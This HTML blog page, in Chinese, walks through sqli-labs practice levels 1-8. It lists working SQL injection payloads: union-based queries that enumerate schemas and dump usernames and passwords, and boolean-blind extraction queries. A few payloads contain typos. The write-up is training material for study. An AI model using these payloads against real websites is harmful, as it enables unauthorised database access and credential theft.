@@ -1,0 +1,451 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sql-labs靶场 | Dokiy's Blog</title><meta name="author" content="Dokiy"><meta name="copyright" content="Dokiy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="几个常用函数1.version() --mysql版本 2.user()    --数据库用户名 3.database() --数据库名 4.@@datadir  --数据库路径 5.@@version_compile_os --操作系统  用于尝试的闭合语句–+可以用 #替换，url提交过程中url编码后的#为%23， - 和# 为注释符，把后面语句注释掉，使其无法执行。空格url转义成%20，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-labs靶场">
+<meta property="og:url" content="https://dokidokiy.github.io/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="Dokiy&#39;s Blog">
+<meta property="og:description" content="几个常用函数1.version() --mysql版本 2.user()    --数据库用户名 3.database() --数据库名 4.@@datadir  --数据库路径 5.@@version_compile_os --操作系统  用于尝试的闭合语句–+可以用 #替换，url提交过程中url编码后的#为%23， - 和# 为注释符，把后面语句注释掉，使其无法执行。空格url转义成%20，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://dokidokiy.github.io/img/head.png">
+<meta property="article:published_time" content="2023-05-12T13:26:15.000Z">
+<meta property="article:modified_time" content="2023-07-18T14:10:34.622Z">
+<meta property="article:author" content="Dokiy">
+<meta property="article:tag" content="sql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dokidokiy.github.io/img/head.png"><link rel="shortcut icon" href="/img/head.png"><link rel="canonical" href="https://dokidokiy.github.io/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sql-labs靶场',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-18 22:10:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="Dokiy's Blog"><span class="site-name">Dokiy's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql-labs靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-12T13:26:15.000Z" title="发表于 2023-05-12 21:26:15">2023-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-18T14:10:34.622Z" title="更新于 2023-07-18 22:10:34">2023-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/">漏洞靶场学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sql-labs靶场"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="几个常用函数"><a href="#几个常用函数" class="headerlink" title="几个常用函数"></a>几个常用函数</h3><pre><code>1.version() --mysql版本
+2.user()    --数据库用户名
+3.database() --数据库名
+4.@@datadir  --数据库路径
+5.@@version_compile_os --操作系统
+</code></pre>
+<h3 id="用于尝试的闭合语句"><a href="#用于尝试的闭合语句" class="headerlink" title="用于尝试的闭合语句"></a>用于尝试的闭合语句</h3><p>–+可以用 #替换，url提交过程中url编码后的#为%23， - 和# 为注释符，把后面语句注释掉，使其无法执行。空格url转义成%20，  ‘ 转义成%27</p>
+<p>有时用–+，而不是#的原因是,http 无法解释#，所以用–+来代替</p>
+<p>–+中起到注释作用其实是–，但是如果单纯的 – 会和后面的内容连上从而导致sql语句出错，所以有了 + 会解释为空格，从而避免报错</p>
+<p>故</p>
+<p>–%20 &lt;==&gt; –+</p>
+<h4 id="sql-labs靶场less1"><a href="#sql-labs靶场less1" class="headerlink" title="sql-labs靶场less1"></a>sql-labs靶场less1</h4><p>1.题目提示输入ID进行get传参，但需要注意的是这个靶场貌似是不区分大小写的，我用大写ID进行传参是没有任何回显的，只有输入id才可以传参，这点需要注意。</p>
+<p>‘ 报错</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230717211409346.png" alt="image-20230717211409346"></p>
+<p>2.尝试使用 # 注释不起作用。采用%23或者–+注释都可以，需要注意</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230717211829588.png" alt="image-20230717211829588"></p>
+<p>3.进一步尝试 输入 id=1’ –+ 发现回显正常</p>
+<pre><code>?id=1&#39; --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718204259099.png" alt="image-20230718204259099"></p>
+<p>4.用order by 判断该语句有几列数据 ?id=1’ order by 3 –+<br> order by 3 回显正常 order by 4 显示错误 证明有三列数据</p>
+<pre><code>?id=1&#39; order by 3 --+  正常
+?id=1&#39; order by 4 --+  报错
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205559129.png" alt="image-20230718205559129"></p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205438777.png" alt="image-20230718205438777"></p>
+<p>5.于是使用 函数查询，此时要将id=1改为一个数据库不存在的数值 比如-1，给后面查询语句留显示位。此时注入语句为： </p>
+<pre><code>?id=-1‘ union select 1,2,3 --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718205841661.png" alt="image-20230718205841661"></p>
+<p>如图可知显示位为2，3位。</p>
+<p>6.然后在2，3位选择一位或者两位 查询数据库<br> 首先查询数据库名称<br> 查询语句：</p>
+<pre><code>?id=-1’ union select 1,2,database() --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718210316321.png" alt="image-20230718210316321"></p>
+<p>可以查看到 数据库名称为security</p>
+<p>7.继续查看表名</p>
+<pre><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39; --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718212438030.png" alt="image-20230718212438030"></p>
+<p> 可以见到表名有emails,referers,uagents,users</p>
+<p>8.因为sql注入主要是查看数据库中有用信息，而这个users 这个表 看起来存有敏感信息，于是我们继续查看users 表中信息。查看users表中的列名。</p>
+<pre><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name =&#39;users&#39; --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718212951955.png" alt="image-20230718212951955"></p>
+<p>可以查看到user中有三个列名id 、username、password</p>
+<p>9.最后查找该表中usename、password的值</p>
+<pre><code>?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230718213610162.png" alt="image-20230718213610162"></p>
+<p>得到所有的数据，注入完成</p>
+<h4 id="sql-labs靶场less2"><a href="#sql-labs靶场less2" class="headerlink" title="sql-labs靶场less2"></a>sql-labs靶场less2</h4><p>tips：可以打开每一关的源码，在该位置添加一句代码方便做题分析，</p>
+<pre><code>echo&quot;sql里面执行的是&quot;.$sql.&quot;&lt;br&gt;&quot;;
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225159607.png" alt="image-20230512225159607"></p>
+<p>1.判断注入类型</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225353576.png" alt="image-20230512225353576"></p>
+<p>可以知道是数值型</p>
+<p>2.判断字段数</p>
+<pre><code>?id=1 order by 4 不正常
+?id=1 order by 3 正常
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225530782.png" alt="image-20230512225530782"></p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230512225927074.png" alt="image-20230512225927074"></p>
+<p>可以确定有三列</p>
+<p>3.判断可以回显的字段数</p>
+<pre><code>?id=-1 union select 1,2,3
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513193541123.png" alt="image-20230513193541123"></p>
+<p>4.判断数据库名和版本</p>
+<pre><code>?id=-1 union select 1,database(),version()
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513194524358.png" alt="image-20230513194524358"></p>
+<p>5.获取表名</p>
+<pre><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195104430.png" alt="image-20230513195104430"></p>
+<p>6.获取列名</p>
+<pre><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195526249.png" alt="image-20230513195526249"></p>
+<p>7.获取数据</p>
+<pre><code>?id=-1 union select 1,username,password from security.users limit 0,1 --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195823876.png" alt="image-20230513195823876"></p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513195921714.png" alt="image-20230513195921714"></p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513200006154.png" alt="image-20230513200006154"></p>
+<p>第n条…..依次类推limit n，1</p>
+<h4 id="sql-labs靶场less3"><a href="#sql-labs靶场less3" class="headerlink" title="sql-labs靶场less3"></a>sql-labs靶场less3</h4><p>今天浅浅复习一下</p>
+<p>1.判断注入点，</p>
+<p>输入？id=1 显示正常 </p>
+<p>​     ？id=1’ 不正常  说明存在注入</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513221043279.png" alt="image-20230513221043279"></p>
+<p>上图显示）附近有语法错误，所以构造语句的时候需要用）进行闭合</p>
+<pre><code>?id=1&#39;) union select 1 --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224322394.png" alt="image-20230513224322394"></p>
+<p>上面图片显示列数不正确，盲猜试试三列</p>
+<p>2.判断字段数</p>
+<pre><code>?id=1&#39;) union select 1,2,3 --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224510771.png" alt="image-20230513224510771"></p>
+<p>字段数为4时报错，说明字段数为3</p>
+<p>3.判断回显</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224733973.png" alt="image-20230513224733973"></p>
+<p>4.查看当前数据库和版本</p>
+<pre><code>?id=-1&#39;) union select 1,database(),version() --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224934066.png" alt="image-20230513224934066"></p>
+<p>5.查看数据库名称</p>
+<pre><code>?id=-1&#39;) union select 1，group_concat(schema_name),3 from information_schema.schemata --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513230621168.png" alt="image-20230513230621168"></p>
+<p>6.查看security库里面的表名</p>
+<pre><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231141345.png" alt="image-20230513231141345"></p>
+<p>7.获取列名</p>
+<pre><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231403867.png" alt="image-20230513231403867"></p>
+<p>8.字段数据</p>
+<p>获取到字段后，根据字段获取表里的数据。字段名之间再加上*字符的十六进制，可以把账号密码隔开，容易区分</p>
+<pre><code>?id=-1&#39;) union select 1,group_concat(username,0x2a,password),3 from users --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231622174.png" alt="image-20230513231622174"></p>
+<p>完成！！！</p>
+<h4 id="sql-labs靶场less4"><a href="#sql-labs靶场less4" class="headerlink" title="sql-labs靶场less4"></a>sql-labs靶场less4</h4><p>在复习一下less4</p>
+<p>less-3是单引号+右括号，less-4是双引号+右括号</p>
+<p>1.判断注入点</p>
+<p>一开始，？id=1 直接回显用户名和密码，</p>
+<p>​              ？id=1’ 也是直接回显用户名和密码</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513235842630.png" alt="image-20230513235842630"></p>
+<p>在尝试一下别的符号</p>
+<p>?id=1”  出现报错信息</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000027873.png" alt="image-20230514000027873"></p>
+<p>错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。</p>
+<p>2.查字段名</p>
+<p>输入</p>
+<pre><code>?id=1&quot;) order by 4 --+
+</code></pre>
+<p>后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000300269.png" alt="image-20230514000300269"></p>
+<p>3.查输出列的位置</p>
+<pre><code>?id=-1&quot;) union select 1,2,3 --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000817750.png" alt="image-20230514000817750"></p>
+<p>4.查看当前数据库和版本</p>
+<pre><code>?id=-1&quot;) union select 1,database(),version() --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001038494.png" alt="image-20230514001038494"></p>
+<p>5.查看当前数据库下的表</p>
+<pre><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001411510.png" alt="image-20230514001411510"></p>
+<p>6.查看user表下面的字段信息</p>
+<pre><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001554807.png" alt="image-20230514001554807"></p>
+<p>7.查看字段数据</p>
+<pre><code>?id=-1&quot;) union select 1,group_concat(username,0x2a,password),3 from users --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001730590.png" alt="image-20230514001730590"></p>
+<p>完成！！！！！！</p>
+<h4 id="sql-labs靶场less6"><a href="#sql-labs靶场less6" class="headerlink" title="sql-labs靶场less6"></a>sql-labs靶场less6</h4><p>1.判断注入点（双引号注入）</p>
+<pre><code>?id=1&quot; and 1 --a   页面显示正常
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514203911904.png" alt="image-20230514203911904"></p>
+<pre><code>?id=1&quot; and 0 -- a   页面异常（空显示）
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514205048775.png" alt="image-20230514205048775"></p>
+<p>2.判断字符长度</p>
+<p>判断当前使用的数据库长度是否大于1</p>
+<pre><code>?id=1&quot; and length(database())=8 --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514221524192.png" alt="image-20230514221524192"></p>
+<p>3.穷举字符</p>
+<p>判断当前使用的数据库第一个字符的ascll码是否大于1（肯定大于），地址栏输入</p>
+<pre><code>?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a
+</code></pre>
+<pre><code>?id=1&quot; and left(database(),1)=&#39;s&#39; --+
+
+用穷举的方法一个个列出来，....效率有点慢了
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514222128909.png" alt="image-20230514222128909"></p>
+<pre><code>?id=1&quot; and left(database(),8)=&#39;security&#39; --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514225957158.png" alt="image-20230514225957158"></p>
+<p>4.判断库中每个表名的长度</p>
+<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 6--+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514232750125.png" alt="image-20230514232750125"></p>
+<p>第一个表的长度是6</p>
+<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) = 8--+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514232933832.png" alt="image-20230514232933832"></p>
+<p>第二个表的长度为8</p>
+<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 2,1)) = 7--+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233146882.png" alt="image-20230514233146882"></p>
+<p>第三个表的长度为7</p>
+<pre><code>?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) = 5--+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233314642.png" alt="image-20230514233314642"></p>
+<p>第四个表的长度为5</p>
+<p>5.爆破表名</p>
+<pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100 --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233558822.png" alt="image-20230514233558822"></p>
+<pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233732069.png" alt="image-20230514233732069"></p>
+<p>查看ascii表101是e，第一个表开头字母是e</p>
+<p>…..此处省略一些步骤</p>
+<pre><code>?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115 --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514234142010.png" alt="image-20230514234142010"></p>
+<p>查看ascii表115是u，第一个表开头字母是u</p>
+<p>….表名是users</p>
+<h4 id="sql-labs靶场less7"><a href="#sql-labs靶场less7" class="headerlink" title="sql-labs靶场less7"></a>sql-labs靶场less7</h4><p>打开题目</p>
+<p>1.判断是否是数字型传参</p>
+<p>2.判断是否有单引号闭合</p>
+<p>3.判断是否有双引号闭合</p>
+<p>4.判断是否单引号+括号闭合</p>
+<p>5.判断是否是双引号+括号闭合</p>
+<p>如果以上都不是，那以上规则都同时加上sleep测试一遍，看是不是存在延时注入</p>
+<h4 id="sql-labs靶场less8"><a href="#sql-labs靶场less8" class="headerlink" title="sql-labs靶场less8"></a>sql-labs靶场less8</h4><p>bool盲注常用的函数</p>
+<pre><code>database()   显示数据库名称
+left(a,b)    从左侧截取a的前b位
+substr(a,b,c) 从b位置开始，截取字符串a到c的长度
+mid(a,b,c)  从b位置开始，截取a字符串的c位
+length()    返回字符串长度
+ascii()      将某个字符转换成ascii值
+char()       将ascii码转换为对应的字符
+</code></pre>
+<p>打开源码看了一下</p>
+<p>这道题可以使用时间盲注，不能使用报错注入，因为报错的信息被注释掉了</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515103641066.png" alt="image-20230515103641066"></p>
+<p>1.判断注入点</p>
+<pre><code>?id=1   页面正常，但是没有显示消息
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515105031032.png" alt="image-20230515105031032"></p>
+<p>加单引号</p>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515105151868.png" alt="image-20230515105151868"></p>
+<p>页面无回显，应该是报错了</p>
+<p>继续试试</p>
+<pre><code>?id=1 and 1=1
+?id=1 and 1=2 页面都正常，说明不是数字型注入，
+?id=1&#39; and 1=1 --+  页面正常，可以正常的显示
+    真      真    真
+?id=1&#39; and 1=2 --+
+   真       假    假
+页面发生变化(没有报错，只是查不出来数据，和上面的无回显不一样)，说明是单引号闭合的字符型注入。
+</code></pre>
+<p>1.查看数据库版本</p>
+<pre><code>?id=1&#39; and left(version(),1)=5 %23
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515112258415.png" alt="image-20230515112258415"></p>
+<p>这个数据库的版本为5.7.42 ，上面的语句是看版本号的第一位是不是5，如果回显正常，那么说明第一位就是5</p>
+<p>上图显示正常，剩下的慢慢测，一般使用脚本。</p>
+<p>2.猜解数据库的长度</p>
+<pre><code>?id=1&#39; and length(database(),1)&gt;&#39;a&#39; --+
+</code></pre>
+<p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515114347238.png" alt="image-20230515114347238"></p>
+<p>数据库长度为 8 时，页面回显正常。这里说明下，长度要一个一个的试，这里只是验证下，在要爆信息不多的情况下可以手动试试（二分法可以提高很多效率），太多的话就建议用脚本，或者用burp 爆破。</p>
+<p>3.猜数据库名字</p>
+<pre><code>?id=1&#39; and left(databse(),1)&gt;&#39;a&#39; --+
+</code></pre>
+<p><code>left(a,b)</code>：返回a字符串从左至b位数，详细看下面用法</p>
+<p>4.猜表名</p>
+<pre><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+
+</code></pre>
+<p>5.猜字段名</p>
+<pre><code>?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+
+</code></pre>
+<p>6.猜数据</p>
+<p>用户名</p>
+<pre><code>?id=1&#39; and left((select username from users limit x,1),y)=&quot;&quot;--+
+</code></pre>
+<p>通过变换x，y的值可以得到所有的用户名 。</p>
+<p>密码</p>
+<pre><code>?id=1&#39; and left((select password from users limit x,1),y)=&quot;&quot;--+
+</code></pre>
+<p>通过变换 x，y 的值可以得到所有的密码 。</p>
+<p>通过布尔盲注手工注入比较繁琐，可以用脚本。</p>
+<p>下面分享脚本</p>
